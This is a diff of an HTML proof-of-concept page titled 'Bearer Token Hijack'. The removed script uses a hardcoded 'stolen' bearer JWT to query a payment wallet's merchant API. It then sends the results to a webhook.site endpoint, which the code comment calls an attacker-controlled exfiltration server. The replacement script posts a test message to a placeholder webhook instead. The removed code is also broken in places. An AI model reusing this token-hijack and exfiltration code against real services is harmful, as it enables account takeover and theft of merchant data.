@@ -8,37 +8,20 @@
   <h1>PoC: Bearer Token Hijack</h1>
   <p>Open console for exfil test...</p>
 
-  <script>
-    console.log("💡 Script started");
-    
-    const stolenToken = "Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoyMjQxNDA2N30.fhIjbSJy6YqifI60URimGdVwPK3t_cM70AUXklvcaSXOoVYDjoNtDpleWEP9h3FCS0ZuSM7k8cY5D6Jfdb_DOA"; // Replace with your test token
+<script>
+  alert("✅ Script loaded!");
+  console.log("💡 Script started");
 
-    fetch("https://pay.wallet.tg/wpay/website-api/v1/merchant", {
-      method: "GET",
-      headers: {
-        "Authorization": stolenToken,
-        "Accept": "application/json"
-      }
-    })
-    .then(response => response.json())
-    .then(response => {
-  console.log("✅ Request sent. Status:", response.status);
-  return response.text(); // Instead of .json()
-})
-.then(raw => {
-  console.log("⚠️ Can't access full JSON due to CORS. Raw body:", raw);
-})
+  document.body.style.backgroundColor = "#ffdddd"; // Visual test
 
-      // Exfiltrate to your controlled server (e.g., webhook.site or custom endpoint)
-      fetch("https://webhook.site/cfb89b16-1571-4db3-b282-adc26a5c8f57", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ stolenMerchantData: data })
-      });
-    })
-    .catch(err => console.error("❌ Exploit failed:", err));
-  </script>
+  fetch("https://webhook.site/YOUR-ID", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({ message: "PoC test triggered" })
+  });
+</script>
+  
 </body>
 </html>
